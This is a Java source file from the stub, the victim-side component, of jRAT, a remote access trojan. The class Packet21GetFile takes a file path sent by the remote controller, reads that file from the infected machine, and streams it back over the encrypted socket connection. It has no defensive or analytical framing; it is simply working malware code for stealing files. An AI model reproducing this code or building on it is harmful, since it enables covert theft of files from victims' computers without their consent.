package io.jrat.stub.packets.incoming;

import io.jrat.common.io.FileIO;
import io.jrat.stub.Connection;
import io.jrat.stub.Main;
import io.jrat.stub.packets.outgoing.Packet29SendFile;

import java.io.File;


public class Packet21GetFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = new File(Connection.readLine());

		if (file.exists() && file.isFile()) {
			Connection.addToSendQueue(new Packet29SendFile(file.getName(), file.getAbsolutePath()));

			FileIO fileio = new FileIO();
			fileio.writeFile(file, Connection.socket, Connection.dos, Connection.dis, null, Main.getKey());

			Connection.lock();
		}
	}

}
